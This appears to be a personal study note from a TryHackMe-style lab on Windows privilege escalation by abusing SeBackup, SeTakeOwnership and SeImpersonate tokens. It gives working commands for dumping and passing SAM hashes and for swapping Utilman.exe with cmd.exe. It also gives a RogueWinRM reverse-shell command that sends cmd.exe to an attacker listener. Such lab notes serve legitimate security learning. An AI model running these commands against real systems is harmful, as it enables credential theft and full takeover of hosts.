---
type: technique
platform: windows
status: working
fluency: guided
source: thm
updated: 2026-08-31
---

# Windows — Privilege Abuse (Se* tokens)

`whoami /priv` is the trigger for this note. A **privilege** is a system-level right that lives in your access token, separate from file DACLs — and a handful of them bypass DACLs entirely. Each one below is a specific power; the question is always the same:

> what does SYSTEM touch that I can reach *with this power* — and a file is one of those things, so "read/write/own any file" is effectively "own the host."

Full catalogue of which privileges are exploitable: **[[Security-Terms#^priv2admin|Priv2Admin]]** on GitHub. Only the ones that hand you a path are here.

| Privilege | Power it grants | Path to SYSTEM |
|---|---|---|
| `SeBackup` / `SeRestore` | Read / write **any file**, ignoring ACLs | Dump `SAM`+`SYSTEM` hives → hashes → pass-the-hash |
| `SeTakeOwnership` | Become **owner** of any object → grant yourself rights | Overwrite a binary that runs as SYSTEM |
| `SeImpersonate` / `SeAssignPrimaryToken` | Act under **another user's token** | Force SYSTEM to authenticate to you, steal its token — the "potato" family |

## Enabling the token first

**Why now** — you ran `whoami /priv` and one of the names above is in the list. Before choosing a technique you confirm the privilege is actually *present in this token*, because it appears only in your elevated one and the whole path depends on it being there at all.

In every case below `whoami /priv` shows the privilege as `Disabled`. That is not a problem — it means *present but not yet activated*; the tool that uses it enables it on demand. **What you need is for the privilege to appear in the list at all.**

It only appears in your **elevated** token. Because of [[Security-Terms#^uac|UAC]], an admin-group account gets two tokens — a filtered one and a full one — and these privileges live only in the full one. So open the console with **"Run as administrator"** before checking; a non-elevated prompt shows a stripped list and none of this works.

**What you will see**

- **Found** — the privilege name with `Disabled` beside it. `Disabled` is the go signal, not a blocker — it is present and the exploit will enable it.
- **Empty** — the name is absent from the whole list. Either you are not in a group that holds it, or you are in a **non-elevated** prompt showing the filtered token — reopen elevated and check again before believing it is gone.
- **Error** — none from `whoami /priv` itself; it always prints. A blank or truncated privileges block is the filtered-token symptom, not a command failure.
- **Noise** — the list is long and most entries (`SeChangeNotifyPrivilege`, `SeShutdown...`, `SeIncreaseWorkingSet...`) are held by every account and lead nowhere. Only the four or five named in this note matter.

**Then** — the specific name you found sends you to its section below: `SeBackup`/`SeRestore`, `SeTakeOwnership`, or `SeImpersonate`/`SeAssignPrimaryToken`. Absent even when elevated means this vector is closed — back to [[Windows-Privilege-Escalation]] for the service, task and software paths.

## SeBackup / SeRestore — read/write any file

**Why now** — `whoami /priv` showed `SeBackupPrivilege` (Backup Operators hold it by default), which means you can read any file on disk regardless of its [[Security-Terms#^acl|ACL]]. The files worth reading are the password-hash hives, because a hash is a credential you can pass without cracking.

Intended for backup software: read every file for a backup, write every file for a restore, without being an administrator. But "read every file" includes the files where password hashes live.

```cmd
reg save hklm\system C:\Users\<you>\system.hive
```

```cmd
reg save hklm\sam    C:\Users\<you>\sam.hive
```

- `reg save` → uses the backup privilege to copy these ACL-protected hives out as ordinary files.
- both hives → `SAM` holds the local [[Security-Terms#^ntlm|NTLM]] hashes (encrypted); `SYSTEM` holds the boot key that decrypts them. **You need both** — `sam.hive` alone is useless, and forgetting `system.hive` is the common mistake that makes `secretsdump` fail later with a decryption error.

Move both to your box (see [[File-Transfer]]) and extract:

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

- `LOCAL` → read from these offline files, not over the network. Omit it and `secretsdump` tries to authenticate to a host called `LOCAL` and fails.

**What you will see**

- **Found** — `The operation completed successfully.` after each `reg save`, then from `secretsdump` a block of `user:RID:LMhash:NThash:::` lines. The `Administrator` line at [[Security-Terms#^rid|RID]] `500` is the one you want; the `NThash` field is the credential.
- **Empty** — `secretsdump` printing only the two stock accounts with no extra users is a real, if dull, answer: local accounts exist but none beyond the defaults. The domain hashes are not here — they live on the [[Security-Terms#^dc|DC]].
- **Error** — `reg save` failing with `Access is denied.` means your token is **not elevated**; go back to the enabling section. `secretsdump` throwing a decryption or struct error almost always means a missing or mismatched `system.hive`.
- **Noise** — `aad3b435b51404eeaad3b435b51404ee` in the LM field is the **empty-LM constant** on every modern host, not a real hash. The `Guest` and `DefaultAccount` lines are stock and usually disabled.

**Then** — the `NThash` needs no cracking: NTLM authentication computes from the hash itself, so the hash **is** the credential. Pass it — [[5985-WinRM]] with `-H <nthash>`, or `psexec.py -hashes <lm>:<nt> administrator@<ip>` for a SYSTEM shell. Cracking it to a plaintext instead (for reuse elsewhere) is [[Hash-Cracking]].

## SeTakeOwnership — own it, then rewrite it

**Why now** — `whoami /priv` showed `SeTakeOwnershipPrivilege`. That lets you become the owner of any object, and an owner can always grant themselves access — so you can seize a SYSTEM-owned binary and overwrite it. You are aiming at a binary that runs as SYSTEM without anyone logging in.

The target is `utilman.exe`: the Ease-of-Access tool on the lock screen, which runs as **SYSTEM before anyone logs in**. Replace it with `cmd.exe` and the accessibility button becomes a SYSTEM shell. (`sethc.exe` — the sticky-keys binary, 5x Shift — is the classic twin of this trick.)

```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

```cmd
icacls  C:\Windows\System32\Utilman.exe /grant <you>:F
```

```cmd
copy    C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

- `takeown /f` → makes you the owner. Ownership alone grants **no** rights yet — this is step one of two, and stopping here is the usual mistake.
- `icacls /grant <you>:F` → *because* you now own it, grant yourself Full control. Skip this line and the `copy` fails with `Access is denied.` even though you own the file.
- `copy` → overwrites `Utilman.exe` with `cmd.exe`. Keep the original first on a live host; you are clobbering a system binary.

**What you will see**

- **Found** — `SUCCESS: The file (or folder) ... now owned by user ...` from `takeown`, then `Successfully processed 1 files.` from `icacls`, then `1 file(s) copied.` from `copy`. All three are the gates; then lock the screen (Win+L) and click Ease of Access for a SYSTEM prompt.
- **Empty** — no blank state: each command answers with its own success string or an error. A silent return means it did not execute — confirm you are in `cmd.exe`, not a dumb shell.
- **Error** — `Access is denied.` on `copy` after a successful `takeown` is the tell that you skipped or botched the `icacls /grant` — ownership without a granted [[Security-Terms#^ace|ACE]] still cannot write. `Access is denied.` on `takeown` itself means the token is not elevated.
- **Noise** — none here; this is a targeted overwrite, not an enumeration.

**Then** — a SYSTEM shell from the lock screen ends the box; run `whoami` to confirm `nt authority\system`. If the host has no interactive lock screen you can reach, this specific target does not apply — the same privilege still overwrites any other SYSTEM-run binary (a service exe), which is the [[Windows-Service-Abuse]] shape. Restore the original `Utilman.exe` afterwards on a live host.

## SeImpersonate / SeAssignPrimaryToken — steal a token

**Why now** — `whoami /priv` showed `SeImpersonatePrivilege`, and you most likely landed as a service account (LOCAL SERVICE, NETWORK SERVICE, or an IIS app-pool identity) that holds it by default. That privilege lets your process act under the token of anyone who authenticates to it — so the whole move is *making SYSTEM authenticate to you.*

This is legitimate and everywhere: a service (FTP, IIS, MSSQL) impersonates each connecting user so the OS enforces file permissions. The abuse inverts it. `SeAssignPrimaryToken` is the sibling that launches a **new process** with the stolen token rather than attaching it to a thread; same outcome. This is why a web shell on IIS is usually one step from SYSTEM.

**[[Security-Terms#^potato|RogueWinRM]]** exploits that starting the **[[Security-Terms#^bits|BITS]]** service — which any unprivileged user can do — makes BITS connect to `127.0.0.1:5985` **as SYSTEM**. Port 5985 is [[Security-Terms#^winrm|WinRM]] ([[5985-WinRM]]); if WinRM is not running the port is free, so you plant a fake listener there, trigger BITS, and catch SYSTEM's authentication.

```bash
nc -lvp 4442
```

- Your catch listener on the attack box. `-l` listen, `-v` verbose so you see the connect, `-p` port — and the port must match the `-a` argument below or SYSTEM's shell connects to nothing.

```cmd
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <your-ip> 4442"
```

- `-p` → the program to run with the stolen SYSTEM token (`nc64.exe`).
- `-a` → its arguments; `-e cmd.exe <your-ip> <port>` is a reverse shell back to your listener. The port here must equal the `nc -lvp` port above.

**What you will see**

- **Found** — after up to two minutes, your `nc` listener prints a connection and a shell prompt; `whoami` in it reads `nt authority\system`. That is the finish.
- **Empty** — the listener never connects and RogueWinRM prints a bind error on 5985: WinRM is already listening there, so the fake listener cannot bind. Not a failure of the privilege — a reason to switch variant (below).
- **Error** — the web shell or console looks **hung for ~2 minutes**: that is BITS having to stop before it restarts (it self-stops about two minutes after starting), not a crash. Run it once and wait. A bind error on port 5985 is the WinRM-already-present case above.
- **Noise** — RogueWinRM prints its own progress chatter before the shell lands; the only line that matters is the connect on your listener.

**Then** — a SYSTEM shell ends the box. A bind failure on 5985 (WinRM present) means switch the [[Security-Terms#^auth-coercion|coercion]] tool while keeping the privilege: **[[Security-Terms#^printspoofer|PrintSpoofer]]** (spooler [[Security-Terms#^fifo|named pipe]]) or **[[Security-Terms#^godpotato|GodPotato]]** are the current go-tos; [[Security-Terms#^juicypotato|JuicyPotato]] is dead on Server 2019+. If `whoami /priv` did **not** show `SeImpersonate`, this whole family is closed — return to [[Windows-Privilege-Escalation]].

## Reading the output

Two maps for when a single technique above stalls.

The whole potato family is one idea with interchangeable triggers: jlajara's *Potatoes* write-up walks every variant and which Windows versions each still works on (`https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html`), and decoder.cloud (`https://decoder.cloud/`) is the primary source most of them came from. The privilege is the constant; the coercion trick is what you swap when a listener will not bind.

Which privileges are exploitable at all is **Priv2Admin** (linked in the intro). If `whoami /priv` shows a `Se*` name not covered here, check it there before assuming it is a dead end.

## Next

- [[Hash-Cracking]] — where SeBackup's dumped hashes go if you can't pass them directly
- [[5985-WinRM]] — the receiving end for a passed hash, and the port RogueWinRM squats on
- [[Windows-Service-Abuse]] — the *other* SYSTEM-binary-overwrite path, via service config
- [[Windows-Run-Sheet#1 — What is this token allowed to do|Windows run sheet, step 1]] — where `whoami /all` sits in the sweep

## Gaps

- SeImpersonate coercion is one example (RogueWinRM/BITS); PrintSpoofer, GodPotato and the named-pipe/spooler mechanics behind them are named but not written.
- No `SeDebugPrivilege` → [[Security-Terms#^lsass|LSASS]] memory dump, and no `SeLoadDriverPrivilege`.
- `secretsdump.py` is shown offline against saved hives only — not `-sam`/`-system` over a live remote registry, nor LSASS/[[Security-Terms#^dpapi|DPAPI]] extraction.
- Nothing on the dropped `nc64.exe`/payload surviving Defender — assumed disabled in the lab.
